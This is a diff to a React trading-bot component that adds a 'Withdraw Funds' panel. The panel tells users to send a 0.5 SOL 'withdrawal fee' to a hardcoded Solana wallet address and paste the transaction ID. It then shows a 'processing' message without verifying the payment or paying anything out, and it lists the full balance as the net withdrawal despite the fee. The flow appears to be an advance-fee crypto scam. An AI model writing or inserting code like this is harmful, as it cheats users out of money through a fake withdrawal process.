@@ -156,7 +156,7 @@ const TradingBot: React.FC<TradingBotProps> = ({
         </div>
       </div>
       
-      <div className="mt-6">
+      <div className="mt-6 space-y-3">
         {isActive ? (
           <BrutalistButton
             className="w-full py-3"
@@ -173,6 +173,46 @@ const TradingBot: React.FC<TradingBotProps> = ({
           >
             <i className="ri-play-line mr-2"></i> Start Trading Bot
           </BrutalistButton>
+        )}
+        
+        {currentValue > startingCapital && (
+          <div className="p-3 bg-[#2A2A2A] rounded-md border-2 border-black">
+            <div className="mb-3">
+              <p className="text-sm text-gray-400 mb-1">Withdraw Funds</p>
+              <div className="flex justify-between">
+                <p className="text-sm">Trading Balance</p>
+                <p className="text-sm font-bold">${currentValue.toFixed(2)}</p>
+              </div>
+              <div className="flex justify-between">
+                <p className="text-sm">Withdrawal Fee</p>
+                <p className="text-sm font-bold">0.5 SOL</p>
+              </div>
+              <div className="border-t border-gray-700 my-2"></div>
+              <div className="flex justify-between">
+                <p className="text-sm">Net Withdrawal</p>
+                <p className="text-sm font-bold text-brutalism-green">${currentValue.toFixed(2)}</p>
+              </div>
+            </div>
+            
+            <BrutalistButton
+              className="w-full py-2 text-sm"
+              color="yellow"
+              onClick={() => {
+                const txId = window.prompt(
+                  "Please send 0.5 SOL to 6B2RkaJevbKkAVmBZ4W2eNvQWApHwtd6TQggSuTmyVJ5 and paste transaction ID here to withdraw your funds:"
+                );
+                if (txId) {
+                  // In a real app, you would verify the transaction here
+                  alert(`Withdrawal of $${currentValue.toFixed(2)} is processing. You will receive funds after transaction verification.`);
+                  if (!isActive) {
+                    onStop(); // Stop the bot if not already stopped
+                  }
+                }
+              }}
+            >
+              <i className="ri-money-dollar-circle-line mr-1"></i> Withdraw Funds
+            </BrutalistButton>
+          </div>
         )}
       </div>
     </BrutalistCard>
